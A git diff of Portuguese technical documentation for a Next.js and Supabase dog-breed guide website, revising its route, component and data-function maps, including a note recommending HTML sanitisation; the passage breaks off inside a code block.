@@ -1,939 +1,1515 @@
 # 📋 Documentação Técnica - Guia do Cachorro
 
-**Versão:** 2.0 (Atualizada)  
-**Data:** Análise Técnica Completa - Atualização Pós-Refatoração  
+**Versão:** 4.0 (Completa e Atualizada com Sistema de Blog)  
+**Data:** Dezembro 2024  
 **Framework:** Next.js 16.1.1 (App Router)  
-**Stack:** TypeScript, Supabase, TailwindCSS, React 19
-
----
-
-## 🔄 Mudanças Recentes (Versão 2.0)
-
-### ✅ Refatoração Completa do Service Layer
-
-**Data:** Atualização pós-refatoração
-
-**Principais Alterações:**
-
-1. **Nova Organização de Arquivos:**
-   - ✅ Criado `lib/data/pages.ts` - Função `getPageBySlug` refatorada
-   - ✅ Criado `lib/types/pages.ts` - Tipo `Page` unificado
-   - ⚠️ `services/pages.ts` ainda existe mas está obsoleto (deve ser removido)
-
-2. **Tipo `Page` Unificado:**
-   - **Antes:** Dois tipos diferentes com campos incompatíveis
-   - **Agora:** Tipo único em `lib/types/pages.ts` com:
-     - `content: string` (HTML) substituindo `description`, `subtitle`, etc.
-     - `status: "draft" | "published"` obrigatório
-     - Campos não-nullable (`slug`, `title`)
-
-3. **Verificação de Status:**
-   - **Antes:** Filtro na query SQL
-   - **Agora:** Verificação no componente (`app/[slug]/page.tsx`)
-   - **Benefício:** Permite flexibilidade futura para preview de drafts
-
-4. **Renderização de Conteúdo:**
-   - **Antes:** Campos separados (`title`, `subtitle`, `description`, `image_url`)
-   - **Agora:** `dangerouslySetInnerHTML` com `page.content` (HTML rico)
-   - **Layout:** Classe `prose` do Tailwind para estilização tipográfica
-
-5. **Atualização do Next.js 16:**
-   - `params` agora é `Promise<{ slug: string }>` (não mais objeto direto)
-   - Necessário usar `await params` antes de acessar propriedades
-
-### ⚠️ Pendências
-
-- `app/not-found.tsx` ainda usa `@/services/pages` (deve ser atualizado)
-- Arquivo `services/pages.ts` ainda existe (deve ser removido)
+**Stack:** TypeScript, Supabase, TailwindCSS, React 19, Framer Motion
 
 ---
 
 ## 📑 Sumário
 
-1. [Visão Geral da Arquitetura](#visão-geral-da-arquitetura)
-2. [Estrutura do Projeto](#estrutura-do-projeto)
-3. [Análise de Roteamento](#análise-de-roteamento)
-4. [Configuração do Supabase](#configuração-do-supabase)
-5. [Service Layer - Duplicação Crítica](#service-layer---duplicação-crítica)
-6. [Integração Next.js + Supabase](#integração-nextjs--supabase)
-7. [Layout e Componentes](#layout-e-componentes)
-8. [Problemas Identificados](#problemas-identificados)
-9. [Hipóteses para o Erro 404 em `/[slug]`](#hipóteses-para-o-erro-404-em-slug)
-10. [Checklist Técnico](#checklist-técnico)
+1. [Visão Geral](#visão-geral)
+2. [Stack Tecnológico](#stack-tecnológico)
+3. [Arquitetura do Projeto](#arquitetura-do-projeto)
+4. [Estrutura Completa de Pastas e Arquivos](#estrutura-completa-de-pastas-e-arquivos)
+5. [Mapeamento de Rotas](#mapeamento-de-rotas)
+6. [Mapeamento de Componentes](#mapeamento-de-componentes)
+7. [Mapeamento de Funções e Módulos](#mapeamento-de-funções-e-módulos)
+8. [Tipos e Interfaces](#tipos-e-interfaces)
+9. [Configuração do Supabase](#configuração-do-supabase)
+10. [Análise de Segurança e Vulnerabilidades](#análise-de-segurança-e-vulnerabilidades)
+11. [Problemas Identificados](#problemas-identificados)
+12. [Pendências e Tarefas](#pendências-e-tarefas)
+13. [Novas Ideias e Melhorias](#novas-ideias-e-melhorias)
+14. [Checklist Técnico](#checklist-técnico)
 
 ---
 
-## 🏗️ Visão Geral da Arquitetura
+## 🎯 Visão Geral
 
-O projeto **Guia do Cachorro** é uma aplicação Next.js moderna que utiliza o **App Router** para gerenciar rotas e renderização. A arquitetura segue o padrão de **CMS-like**, onde conteúdo dinâmico é gerenciado via Supabase e renderizado através de rotas dinâmicas.
+O **Guia do Cachorro** é uma aplicação web moderna construída com Next.js 16, oferecendo um guia completo sobre raças de cães. A aplicação utiliza o App Router do Next.js para gerenciamento de rotas, Supabase como backend (PostgreSQL), e TailwindCSS para estilização.
 
-### Stack Tecnológico
+### Características Principais
 
-- **Next.js 16.1.1** - App Router (React Server Components)
-- **React 19.3** - Biblioteca UI
-- **TypeScript 5** - Tipagem estática
-- **Supabase 2.90.1** - Backend as a Service (PostgreSQL)
-- **TailwindCSS 4** - Framework CSS utility-first
-- **Framer Motion 12.25** - Animações (presente nas dependências)
-
-### Padrão Arquitetural
-
-```
-┌─────────────────────────────────────────┐
-│         Next.js App Router              │
-│  ┌──────────┐  ┌──────────┐            │
-│  │  Home    │  │ [slug]   │            │
-│  │  /       │  │ /sobre   │            │
-│  └────┬─────┘  └────┬─────┘            │
-│       │             │                   │
-│       └──────┬──────┘                   │
-│              │                          │
-│       ┌──────▼──────┐                   │
-│       │  lib/data/  │                   │
-│       │  pages.ts   │                   │
-│       └──────┬──────┘                   │
-│              │                          │
-│       ┌──────▼──────┐                   │
-│       │   Supabase  │                   │
-│       │   Client    │                   │
-│       └──────┬──────┘                   │
-│              │                          │
-│       ┌──────▼──────┐                   │
-│       │  Database   │                   │
-│       │  (pages)    │                   │
-│       └─────────────┘                   │
-└─────────────────────────────────────────┘
-```
+- ✅ **CMS-like**: Conteúdo dinâmico gerenciado via Supabase
+- ✅ **SSR/SSG**: Renderização no servidor para melhor SEO
+- ✅ **TypeScript**: Tipagem estática em todo o projeto
+- ✅ **Design Responsivo**: Interface moderna e adaptável
+- ✅ **Animações**: Framer Motion para transições suaves
+- ✅ **Busca e Filtros**: Sistema de busca e categorização de raças
+- ✅ **Sistema de Blog**: Artigos e posts sobre cuidados com cães
+- ✅ **Navegação Atualizada**: Menu com acesso direto ao blog
 
 ---
 
-## 📁 Estrutura do Projeto
+## 💻 Stack Tecnológico
+
+### Dependências Principais
+
+| Pacote | Versão | Propósito |
+|--------|--------|-----------|
+| `next` | 16.1.1 | Framework React com App Router |
+| `react` | 19.2.3 | Biblioteca UI |
+| `react-dom` | 19.2.3 | Renderização React DOM |
+| `@supabase/supabase-js` | 2.90.1 | Cliente Supabase (PostgreSQL) |
+| `tailwindcss` | 4 | Framework CSS utility-first |
+| `framer-motion` | 12.26.2 | Biblioteca de animações |
+| `typescript` | 5 | Superset JavaScript com tipagem |
+| `clsx` | 2.1.1 | Utilitário para classes condicionais |
+| `tailwind-merge` | 3.4.0 | Merge de classes Tailwind |
+
+### Dependências de Desenvolvimento
+
+| Pacote | Versão | Propósito |
+|--------|--------|-----------|
+| `@types/node` | ^20 | Tipos TypeScript para Node.js |
+| `@types/react` | ^19 | Tipos TypeScript para React |
+| `@types/react-dom` | ^19 | Tipos TypeScript para React DOM |
+| `eslint` | ^9 | Linter JavaScript/TypeScript |
+| `eslint-config-next` | 16.1.1 | Configuração ESLint para Next.js |
+
+---
+
+## 🏗️ Arquitetura do Projeto
+
+### Diagrama de Arquitetura
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    Next.js App Router                        │
+│  ┌──────────┐  ┌──────────┐  ┌──────────┐                  │
+│  │   Home   │  │ [slug]   │  │ /racas   │                  │
+│  │    /     │  │ /sobre   │  │/racas/   │                  │
+│  └────┬─────┘  └────┬─────┘  └────┬─────┘                  │
+│       │             │             │                         │
+│       └─────────────┴─────────────┘                         │
+│                      │                                      │
+│              ┌───────▼────────┐                            │
+│              │  lib/data/     │                            │
+│              │  - pages.ts    │                            │
+│              │  - breeds.ts   │                            │
+│              └───────┬────────┘                            │
+│                      │                                      │
+│              ┌───────▼────────┐                            │
+│              │ lib/supabase.ts│                            │
+│              │  (Singleton)   │                            │
+│              └───────┬────────┘                            │
+│                      │                                      │
+│              ┌───────▼────────┐                            │
+│              │   Supabase     │                            │
+│              │   PostgreSQL   │                            │
+│              └────────────────┘                            │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### Padrões Arquiteturais
+
+1. **Server Components**: Maioria dos componentes são Server Components (melhor performance)
+2. **Client Components**: Apenas onde necessário (interatividade, hooks)
+3. **Separação de Responsabilidades**: 
+   - `lib/data/` - Acesso a dados
+   - `lib/types/` - Definições de tipos
+   - `components/` - Componentes React
+4. **Singleton Pattern**: Cliente Supabase compartilhado
+5. **Type Safety**: TypeScript em todo o projeto
+
+---
+
+## 📁 Estrutura Completa de Pastas e Arquivos
 
 ### Árvore de Diretórios
 
 ```
 guia-do-cachorro/
-├── app/                        # Next.js App Router
-│   ├── [slug]/                # Rota dinâmica (catch-all para páginas)
-│   │   └── page.tsx           # Componente Server Component para /[slug]
-│   ├── layout.tsx             # Layout global da aplicação
-│   ├── page.tsx               # Home page (/)
-│   ├── not-found.tsx          # Página 404 customizada
-│   ├── globals.css            # Estilos globais
-│   └── favicon.ico            # Ícone do site
+├── app/                              # Next.js App Router
+│   ├── [slug]/                      # Rota dinâmica para páginas
+│   │   └── page.tsx                 # Componente Server Component para /[slug]
+│   ├── blog/                        # Módulo de blog (artigos)
+│   │   ├── [slug]/                  # Rota dinâmica para detalhes do artigo
+│   │   │   └── page.tsx             # Página de detalhes do artigo
+│   │   └── page.tsx                 # Listagem de todos os artigos
+│   ├── racas/                       # Módulo de raças
+│   │   ├── [slug]/                  # Rota dinâmica para detalhes da raça
+│   │   │   └── page.tsx             # Página de detalhes da raça
+│   │   └── page.tsx                 # Listagem de todas as raças
+│   ├── sobre/                       # Página Sobre
+│   │   └── page.tsx                 # Página sobre o projeto
+│   ├── layout.tsx                   # Layout global da aplicação
+│   ├── page.tsx                     # Home page (/)
+│   ├── not-found.tsx                # Página 404 customizada
+│   ├── globals.css                  # Estilos globais
+│   └── favicon.ico                  # Ícone do site
 │
-├── components/                 # Componentes React reutilizáveis
-│   ├── Header.tsx             # ⚠️ Componente NÃO utilizado
-│   ├── Hero.tsx
-│   ├── PopularBreeds.tsx
-│   ├── CareGuides.tsx
-│   ├── FAQ.tsx
-│   ├── LatestPosts.tsx
-│   ├── EditorialHighlights.tsx
-│   ├── AuthoritySection.tsx
-│   ├── FinalCTA.tsx
-│   └── Footer.tsx
+├── components/                      # Componentes React reutilizáveis
+│   ├── blog/                        # Componentes do blog
+│   │   └── ArticleCard.tsx         # Card individual de artigo (Client)
+│   ├── breeds/                      # Componentes específicos de raças
+│   │   ├── BreedCard.tsx           # Card individual de raça (Client)
+│   │   ├── BreedGrid.tsx           # Grid com busca e filtros (Client)
+│   │   ├── BreedStats.tsx          # Estatísticas da raça
+│   │   └── CategoryFilter.tsx      # Filtro de categorias (Client)
+│   ├── home/                        # Componentes da página inicial
+│   │   ├── AuthoritySection.tsx    # Seção de autoridade
+│   │   ├── CareGuides.tsx          # Guias de cuidados
+│   │   ├── EditorialHighlights.tsx # Destaques editoriais
+│   │   ├── FAQ.tsx                 # Seção FAQ
+│   │   ├── FinalCTA.tsx            # Call-to-action final
+│   │   ├── Hero.tsx                # Hero section da home
+│   │   └── PopularBreeds.tsx       # Raças populares (dados estáticos)
+│   ├── layout/                      # Componentes de layout
+│   │   ├── Header.tsx              # Header fixo (Server Component)
+│   │   └── Footer.tsx              # Footer (Server Component)
 │
-├── lib/                        # Utilitários e configurações
-│   ├── supabase.ts            # Cliente Supabase (singleton)
-│   ├── data/                  # Camada de acesso a dados
-│   │   └── pages.ts           # ✅ getPageBySlug (em uso)
-│   └── types/                 # Tipos TypeScript
-│       └── pages.ts           # ✅ Tipo Page unificado
+├── lib/                             # Utilitários e configurações
+│   ├── data/                        # Camada de acesso a dados
+│   │   ├── articles.ts             # ✅ Funções getAllArticles, getFeaturedArticles, getArticleBySlug
+│   │   ├── pages.ts                # ✅ Função getPageBySlug
+│   │   └── breeds.ts               # ✅ Funções getAllBreeds, getBreedBySlug
+│   ├── types/                       # Tipos TypeScript
+│   │   └── pages.ts                # ✅ Tipo Page unificado
+│   └── supabase.ts                 # Cliente Supabase (singleton)
 │
-├── services/                   # ⚠️ Legacy - não utilizado
-│   └── pages.ts               # ❌ Versão antiga (obsoleta)
+├── public/                          # Arquivos estáticos
+│   ├── file.svg
+│   ├── globe.svg
+│   ├── next.svg
+│   ├── vercel.svg
+│   └── window.svg
 │
-├── public/                     # Arquivos estáticos
-├── next.config.ts             # Configuração do Next.js
-├── tsconfig.json              # Configuração TypeScript
-└── package.json               # Dependências do projeto
+├── .gitignore                      # Arquivos ignorados pelo Git
+├── DOCUMENTACAO_TECNICA.md        # Esta documentação
+├── eslint.config.mjs              # Configuração ESLint
+├── next.config.ts                 # Configuração do Next.js
+├── package.json                   # Dependências e scripts
+├── postcss.config.mjs             # Configuração PostCSS
+├── README.md                      # README do projeto
+└── tsconfig.json                  # Configuração TypeScript
 ```
 
 ### Análise por Diretório
 
-#### `app/`
-- **Propósito:** Contém todas as rotas da aplicação via App Router
-- **Observação:** Não há uso de grupos de rotas `(pages)` ou layouts aninhados
-- **Arquitetura:** Estrutura simples com layout global único
+#### `app/` - Next.js App Router
+- **Propósito**: Contém todas as rotas da aplicação
+- **Arquitetura**: Estrutura de arquivos determina rotas
+- **Observações**: 
+  - Rotas dinâmicas: `[slug]`, `racas/[slug]`
+  - Layout global aplicado automaticamente
 
-#### `components/`
-- **Propósito:** Componentes React reutilizáveis (Client ou Server Components)
-- **⚠️ Problema:** O arquivo `Header.tsx` existe mas não é utilizado
-- **Padrão:** Componentes modulares separados por responsabilidade
+#### `components/` - Componentes React
+- **Propósito**: Componentes reutilizáveis
+- **Estrutura**: 
+  - `breeds/` - Componentes específicos de raças
+  - `layout/` - Componentes de layout (Header, Footer)
+- **⚠️ Problema**: Header.tsx e Footer.tsx duplicados (legacy não utilizado)
 
-#### `lib/`
-- **Propósito:** Utilitários compartilhados e configurações
-- **⚠️ Problema Crítico:** Duplicação de lógica de busca de páginas (ver seção específica)
+#### `lib/` - Biblioteca de Utilitários
+- **Propósito**: Lógica compartilhada, tipos e configurações
+- **Estrutura**:
+  - `data/` - Funções de acesso a dados (Supabase)
+  - `types/` - Definições de tipos TypeScript
+  - `supabase.ts` - Cliente Supabase singleton
 
-#### `services/`
-- **Propósito:** Camada de abstração para comunicação com APIs/externals
-- **Uso Atual:** Contém a função `getPageBySlug` que está sendo utilizada
+#### `public/` - Arquivos Estáticos
+- **Propósito**: Assets públicos (imagens, ícones)
+- **Acesso**: Via URL `/file.svg`
 
 ---
 
-## 🗺️ Análise de Roteamento
+## 🗺️ Mapeamento de Rotas
 
-### Estrutura de Rotas no App Router
+### Rotas Identificadas
 
-O Next.js 16 App Router funciona através da estrutura de arquivos. Cada arquivo `page.tsx` dentro de uma pasta representa uma rota.
+| Rota | Arquivo | Tipo | Componente | Status |
+|------|---------|------|------------|--------|
+| `/` | `app/page.tsx` | Estática | Home | ✅ Funcionando |
+| `/[slug]` | `app/[slug]/page.tsx` | Dinâmica | DynamicPage | ✅ Funcionando |
+| `/blog` | `app/blog/page.tsx` | Estática | BlogPage | ✅ Funcionando |
+| `/blog/[slug]` | `app/blog/[slug]/page.tsx` | Dinâmica | ArticlePage | ✅ Funcionando |
+| `/racas` | `app/racas/page.tsx` | Estática | RacasPage | ✅ Funcionando |
+| `/racas/[slug]` | `app/racas/[slug]/page.tsx` | Dinâmica | BreedDetailsPage | ✅ Funcionando |
+| `/sobre` | `app/sobre/page.tsx` | Estática | SobrePage | ✅ Funcionando |
+| `/404` | `app/not-found.tsx` | Especial | NotFound | ✅ Funcionando |
 
-#### Rotas Identificadas
+### Detalhamento das Rotas
 
-| Rota | Arquivo | Tipo | Status |
-|------|---------|------|--------|
-| `/` | `app/page.tsx` | Estática | ✅ Funcionando |
-| `/[slug]` | `app/[slug]/page.tsx` | Dinâmica | ⚠️ **Problema: 404** |
-| `/404` | `app/not-found.tsx` | Especial | ✅ Funcionando |
-
-### 1. Rota Home (`/`)
+#### 1. Home (`/`)
 
 **Arquivo:** `app/page.tsx`
 
 **Características:**
-- ✅ Server Component (default no App Router)
-- ✅ Importa múltiplos componentes da pasta `components/`
-- ✅ Layout simples, sem dados externos
+- ✅ Server Component
+- ✅ Composição de múltiplos componentes
+- ✅ Sem fetch de dados (dados estáticos nos componentes)
 
-**Fluxo de Renderização:**
+**Componentes Utilizados:**
+```typescript
+<Hero />
+<AuthoritySection />
+<PopularBreeds />
+<EditorialHighlights articles={articles} />
+<FinalCTA />
+```
+
+**Dados Utilizados:**
+- `getFeaturedArticles()` - Busca artigos em destaque para a seção EditorialHighlights
+
+**Fluxo:**
 ```
 Usuário acessa / 
-→ Next.js carrega app/page.tsx 
-→ Renderiza componentes (Hero, FAQ, etc.)
-→ Envia HTML completo ao cliente
+→ Next.js renderiza app/page.tsx 
+→ Composição de componentes
+→ HTML enviado ao cliente
 ```
 
-**Código:**
-```12:29:app/page.tsx
-export default function Home() {
-  return (
-    <>
-     
-      <Hero />
-      <AuthoritySection />
-      <EditorialHighlights />
-      <FAQ />
-      <PopularBreeds />
-      <CareGuides />
-      <LatestPosts />
-      <FinalCTA />
-      <Footer />
-    </>
-  );
-}
-```
-
-### 2. Rota Dinâmica `/[slug]` (PROBLEMA CRÍTICO)
+#### 2. Rota Dinâmica `/[slug]`
 
 **Arquivo:** `app/[slug]/page.tsx`
 
 **Características:**
 - ✅ Server Component assíncrono
-- ✅ Recebe `params` via props tipadas
-- ✅ Busca dados do Supabase via `getPageBySlug`
-- ⚠️ **Chama `notFound()` se página não existir**
+- ✅ Busca dados do Supabase
+- ✅ Verifica status "published"
+- ✅ Renderiza HTML via `dangerouslySetInnerHTML`
 
-**Fluxo de Renderização:**
+**Funções Utilizadas:**
+- `getPageBySlug(slug)` - Busca página no Supabase
+
+**Fluxo:**
 ```
 Usuário acessa /sobre
 → Next.js identifica [slug] = "sobre"
 → Carrega app/[slug]/page.tsx
+→ await params para obter slug
 → Chama getPageBySlug("sobre")
-→ Se retornar null → notFound() → renderiza not-found.tsx
-→ Se retornar dados → renderiza página
+→ Verifica status === "published"
+→ Se não encontrar ou status !== "published": notFound()
+→ Se encontrar: renderiza página com HTML
 ```
 
-**Código Completo:**
-```8:25:app/[slug]/page.tsx
+**Código Principal:**
+```typescript
 export default async function DynamicPage({ params }: PageProps) {
   const { slug } = await params
-
   const page = await getPageBySlug(slug)
-
+  
   if (!page || page.status !== "published") {
     notFound()
   }
-
+  
   return (
     <main className="prose mx-auto py-10">
       <h1>{page.title}</h1>
-
-      <div
-        dangerouslySetInnerHTML={{ __html: page.content }}
-      />
+      <div dangerouslySetInnerHTML={{ __html: page.content }} />
     </main>
   )
 }
 ```
 
-**⚠️ Pontos Críticos:**
+#### 3. Listagem de Raças (`/racas`)
 
-1. **Uso de `notFound()`:** Quando `getPageBySlug` retorna `null`, o componente chama `notFound()`. Isso é **correto**, mas o problema está na **causa do `null`** (ver seção de hipóteses).
+**Arquivo:** `app/racas/page.tsx`
 
-2. **Tipagem de `params`:** O tipo `PageProps` está atualizado para Next.js 16 (params é Promise):
-   ```typescript
-   type PageProps = {
-     params: Promise<{ slug: string }>
-   }
-   ```
-   **⚠️ Mudança Importante:** No Next.js 16, `params` é uma Promise que precisa ser `await` antes de usar.
+**Características:**
+- ✅ Server Component assíncrono
+- ✅ Busca todas as raças do Supabase
+- ✅ Renderiza BreedGrid (Client Component)
 
-3. **Verificação de Status:** Agora verifica `page.status !== "published"` explicitamente no componente, permitindo flexibilidade na query.
+**Funções Utilizadas:**
+- `getAllBreeds()` - Busca todas as raças
 
-4. **Renderização de Conteúdo:** Usa `dangerouslySetInnerHTML` para renderizar HTML armazenado em `page.content`, indicando que o conteúdo é rico em HTML.
+**Fluxo:**
+```
+Usuário acessa /racas
+→ Next.js renderiza app/racas/page.tsx
+→ await getAllBreeds()
+→ Renderiza BreedGrid com dados
+→ BreedGrid implementa busca e filtros (client-side)
+```
 
-5. **Async/Await:** O componente é `async`, o que está **correto** para Server Components que fazem fetch de dados. Agora também faz `await params` para acessar o slug.
+#### 4. Detalhes da Raça (`/racas/[slug]`)
 
-### 3. Página 404 (`not-found.tsx`)
+**Arquivo:** `app/racas/[slug]/page.tsx`
+
+**Características:**
+- ✅ Server Component assíncrono
+- ✅ Busca raça específica no Supabase
+- ✅ Layout rico com imagem hero
+- ✅ Renderiza estatísticas da raça
+
+**Funções Utilizadas:**
+- `getBreedBySlug(slug)` - Busca raça específica
+
+**Componentes Utilizados:**
+- `BreedStats` - Estatísticas da raça
+
+**Fluxo:**
+```
+Usuário acessa /racas/labrador
+→ Next.js identifica [slug] = "labrador"
+→ await params
+→ Chama getBreedBySlug("labrador")
+→ Se não encontrar: notFound()
+→ Se encontrar: renderiza página de detalhes
+```
+
+#### 5. Listagem de Artigos (`/blog`)
+
+**Arquivo:** `app/blog/page.tsx`
+
+**Características:**
+- ✅ Server Component assíncrono
+- ✅ Busca todos os artigos
+- ✅ Renderiza grid de artigos
+- ✅ Empty state quando não há artigos
+
+**Funções Utilizadas:**
+- `getAllArticles()` - Busca todos os artigos
+
+**Componentes Utilizados:**
+- `ArticleCard` - Card individual de artigo
+
+**Fluxo:**
+```
+Usuário acessa /blog
+→ Next.js renderiza app/blog/page.tsx
+→ await getAllArticles()
+→ Renderiza grid com ArticleCard para cada artigo
+→ Se não houver artigos: mostra empty state
+```
+
+#### 6. Detalhes do Artigo (`/blog/[slug]`)
+
+**Arquivo:** `app/blog/[slug]/page.tsx`
+
+**Características:**
+- ✅ Server Component assíncrono
+- ✅ Busca artigo específico pelo slug
+- ✅ Layout rico com imagem hero
+- ✅ Renderiza conteúdo HTML via `dangerouslySetInnerHTML`
+- ✅ Calcula tempo de leitura automaticamente
+
+**Funções Utilizadas:**
+- `getArticleBySlug(slug)` - Busca artigo específico
+
+**Fluxo:**
+```
+Usuário acessa /blog/ansiedade-separacao
+→ Next.js identifica [slug] = "ansiedade-separacao"
+→ await params
+→ Chama getArticleBySlug("ansiedade-separacao")
+→ Se não encontrar: notFound()
+→ Se encontrar: renderiza página de detalhes com conteúdo HTML
+```
+
+**⚠️ Segurança:**
+- Usa `dangerouslySetInnerHTML` para renderizar conteúdo HTML
+- Recomendado implementar sanitização (DOMPurify)
+
+#### 7. Página Sobre (`/sobre`)
+
+**Arquivo:** `app/sobre/page.tsx`
+
+**Características:**
+- ✅ Server Component
+- ✅ Página estática sobre o projeto
+
+#### 8. Página 404 (`not-found.tsx`)
 
 **Arquivo:** `app/not-found.tsx`
 
 **Características:**
 - ✅ Server Component assíncrono
-- ✅ Busca uma página com slug "404" no Supabase
-- ✅ Renderiza fallback se não encontrar a página "404"
+- ✅ Busca página "404" no Supabase (opcional)
+- ✅ Fallback local se não encontrar
+- ✅ Try-catch para erros
 
-**Observação:** A página `not-found.tsx` também busca dados do Supabase, o que pode causar **recursão** se o Supabase estiver fora do ar.
+**Funções Utilizadas:**
+- `getPageBySlug("404")` - Tenta buscar página 404 customizada
 
-**Código:**
-```6:59:app/not-found.tsx
-export default async function NotFound() {
-  const page = await getPageBySlug("404");
-
-  const imageUrl = page?.image_url?.trim();
-
-  return (
-    <>
-      
-
-      <main className="relative min-h-[calc(100vh-64px)] w-full">
-        {/* IMAGEM FULL */}
-        {imageUrl && (
-          <Image
-            src={imageUrl}
-            alt={page?.title ?? "Página não encontrada"}
-            fill
-            priority
-            className="object-cover"
-          />
-        )}
-
-        {/* OVERLAY */}
-        <div className="absolute inset-0 bg-black/60" />
-
-        {/* CONTEÚDO */}
-        <div className="relative z-10 flex min-h-[calc(100vh-64px)] flex-col items-center justify-center text-center px-6 text-white">
-          <h1 className="text-4xl md:text-5xl font-bold mb-4">
-            {page?.title ?? "Página não encontrada"}
-          </h1>
-
-          <p className="max-w-xl text-lg opacity-90 mb-8">
-            {page?.description ??
-              "Você chegou até aqui, mas essa página não existe ou foi movida."}
-          </p>
-
-          <div className="flex gap-4">
-            <Link
-              href="/"
-              className="rounded-xl bg-white px-6 py-3 font-semibold text-black hover:opacity-90 transition"
-            >
-              Voltar para Home
-            </Link>
-
-            <Link
-              href="/racas"
-              className="rounded-xl border border-white px-6 py-3 font-semibold hover:bg-white hover:text-black transition"
-            >
-              Ver Raças
-            </Link>
-          </div>
-        </div>
-      </main>
-    </>
-  );
-}
+**Fluxo:**
+```
+notFound() é chamado
+→ Next.js renderiza app/not-found.tsx
+→ Tenta buscar página "404" no Supabase
+→ Se falhar: usa fallback local
+→ Renderiza página 404
 ```
 
 ---
 
-## 🗄️ Configuração do Supabase
+## 🧩 Mapeamento de Componentes
 
-### Cliente Supabase
+### Componentes por Categoria
 
-**Arquivo:** `lib/supabase.ts`
+#### Componentes de Layout
 
-**Código:**
-```1:6:lib/supabase.ts
-import { createClient } from '@supabase/supabase-js';
+| Componente | Arquivo | Tipo | Status | Descrição |
+|------------|---------|------|--------|-----------|
+| `Header` | `components/layout/Header.tsx` | Server | ✅ Em uso | Header fixo com navegação (menu: Raças, Saúde, Blog, Sobre) |
+| `Footer` | `components/layout/Footer.tsx` | Server | ✅ Em uso | Footer com links e newsletter |
 
+#### Componentes de Blog
+
+| Componente | Arquivo | Tipo | Status | Descrição |
+|------------|---------|------|--------|-----------|
+| `ArticleCard` | `components/blog/ArticleCard.tsx` | Client | ✅ Em uso | Card individual de artigo com imagem, categoria e data |
+
+#### Componentes de Raças
+
+| Componente | Arquivo | Tipo | Status | Descrição |
+|------------|---------|------|--------|-----------|
+| `BreedCard` | `components/breeds/BreedCard.tsx` | Client | ✅ Em uso | Card individual de raça |
+| `BreedGrid` | `components/breeds/BreedGrid.tsx` | Client | ✅ Em uso | Grid com busca e filtros |
+| `BreedStats` | `components/breeds/BreedStats.tsx` | Server/Client | ✅ Em uso | Estatísticas da raça |
+| `CategoryFilter` | `components/breeds/CategoryFilter.tsx` | Client | ✅ Em uso | Filtro de categorias |
+
+#### Componentes da Home
+
+| Componente | Arquivo | Tipo | Status | Descrição |
+|------------|---------|------|--------|-----------|
+| `Hero` | `components/home/Hero.tsx` | Server | ✅ Em uso | Hero section |
+| `AuthoritySection` | `components/home/AuthoritySection.tsx` | Server | ✅ Em uso | Seção de autoridade |
+| `EditorialHighlights` | `components/home/EditorialHighlights.tsx` | Server | ✅ Em uso | Destaques editoriais (recebe artigos como prop) |
+| `PopularBreeds` | `components/home/PopularBreeds.tsx` | Server | ✅ Em uso | Raças populares (dados estáticos) |
+| `FinalCTA` | `components/home/FinalCTA.tsx` | Server | ✅ Em uso | Call-to-action final |
+
+### Detalhamento dos Componentes Principais
+
+#### `Header` (Layout)
+
+**Arquivo:** `components/layout/Header.tsx`
+
+**Características:**
+- ✅ Server Component
+- ✅ Menu de navegação fixo: Raças, Saúde, Blog, Sobre
+- ✅ Logo com link para home
+- ✅ Botão CTA "Explorar Raças"
+- ✅ Menu mobile (preparado para implementação)
+
+**Menu de Navegação:**
+- **Raças**: Link para `/racas`
+- **Saúde**: Link para `/saude` (normalizado)
+- **Blog**: Link para `/blog` ✅ (atualizado de "Curiosidades")
+- **Sobre**: Link para `/sobre`
+
+**Dependências:**
+- `lucide-react` - Ícones (Dog, Menu)
+
+#### `ArticleCard` (Blog)
+
+**Arquivo:** `components/blog/ArticleCard.tsx`
+
+**Características:**
+- ✅ Client Component (`"use client"`)
+- ✅ Link para detalhes do artigo
+- ✅ Imagem com hover effect
+- ✅ Badge de categoria
+- ✅ Data formatada em português
+- ✅ Resumo do artigo (excerpt)
+
+**Animações:**
+- Scale no hover da imagem
+- Translate no hover do card
+- Transição de cor no título
+
+#### `BreedGrid` (Raças)
+
+**Arquivo:** `components/breeds/BreedGrid.tsx`
+
+**Características:**
+- ✅ Client Component (`"use client"`)
+- ✅ Busca em tempo real
+- ✅ Filtro por categoria
+- ✅ Animações com Framer Motion
+
+**Funcionalidades:**
+- Busca por nome da raça
+- Filtro por categoria
+- Empty state quando não encontra resultados
+- Animações suaves na transição
+
+**Hooks Utilizados:**
+- `useState` - Categoria ativa, termo de busca
+- `useMemo` - Categorias únicas, raças filtradas
+
+#### `BreedCard` (Raças)
+
+**Arquivo:** `components/breeds/BreedCard.tsx`
+
+**Características:**
+- ✅ Client Component (`"use client"`)
+- ✅ Animação de entrada
+- ✅ Hover effects
+- ✅ Link para detalhes da raça
+
+**Animações:**
+- Fade in na entrada
+- Scale no hover da imagem
+- Rotação do ícone no hover
+
+---
+
+## 🔧 Mapeamento de Funções e Módulos
+
+### Funções de Acesso a Dados
+
+#### `lib/data/articles.ts`
+
+**Interface:** `Article`
+
+**Definição:**
+```typescript
+export interface Article {
+  id?: number;
+  slug: string;
+  title: string;
+  excerpt: string;
+  image: string;
+  image_url: string; // Alias para compatibilidade
+  category: string;
+  author: string;
+  date: string;
+  created_at: string; // Para compatibilidade com componentes
+  readTime: string;
+  content?: string; // Conteúdo HTML do artigo
+}
+```
+
+**Função 1:** `getAllArticles(): Promise<Article[]>`
+
+**Descrição:** Busca todos os artigos do blog
+
+**Retorno:**
+- `Promise<Article[]>` - Array de artigos
+
+**Usada em:**
+- `app/blog/page.tsx`
+
+**Função 2:** `getFeaturedArticles(): Promise<Article[]>`
+
+**Descrição:** Busca artigos em destaque para a página inicial
+
+**Retorno:**
+- `Promise<Article[]>` - Array de artigos em destaque
+
+**Usada em:**
+- `app/page.tsx` (página inicial)
+
+**Função 3:** `getArticleBySlug(slug: string): Promise<Article | undefined>`
+
+**Descrição:** Busca um artigo específico pelo slug
+
+**Parâmetros:**
+- `slug: string` - Slug do artigo
+
+**Retorno:**
+- `Promise<Article | undefined>` - Artigo encontrado ou undefined
+
+**Usada em:**
+- `app/blog/[slug]/page.tsx`
+
+**Observação:** ⚠️ Atualmente usa dados estáticos (array em memória). Futuro: migrar para Supabase.
+
+#### `lib/data/pages.ts`
+
+**Função:** `getPageBySlug(slug: string): Promise<Page | null>`
+
+**Descrição:** Busca uma página pelo slug no Supabase
+
+**Parâmetros:**
+- `slug: string` - Slug da página
+
+**Retorno:**
+- `Promise<Page | null>` - Página encontrada ou null
+
+**Implementação:**
+```typescript
